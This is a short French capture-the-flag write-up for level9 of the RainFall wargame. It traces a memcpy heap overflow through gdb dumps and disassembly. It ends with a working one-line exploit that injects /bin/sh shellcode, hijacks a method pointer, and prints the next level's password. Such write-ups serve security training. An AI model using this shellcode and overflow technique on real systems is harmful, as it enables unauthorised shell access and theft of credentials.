# LEVEL9


Il y a un appel à la fonction memcpy dans la methode setAnnotation de la classe N. On va faire un buffer overflow sur la fonction memcpy.

```
gdb level9
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
(gdb) x/x $esp
0xbffff6a0:	0x0804a008
(gdb) x/30x 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x08048848	0x00000000

```

La chaîne stocké commence à l'adresse 0x0804a00c


```
   (**(code **)*s2)(s2, s1); // (code **) = (cast **)

   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)

   ***arg_8h ()

```

```
level9@RainFall:~$ ./level9 $(python2 -c 'print("\x10\xa0\x04\x08"+"\x14\xa0\x04\x08"+"\x90"*4+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"A"*51+"\x0c\xa0\x04\x08")')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
```

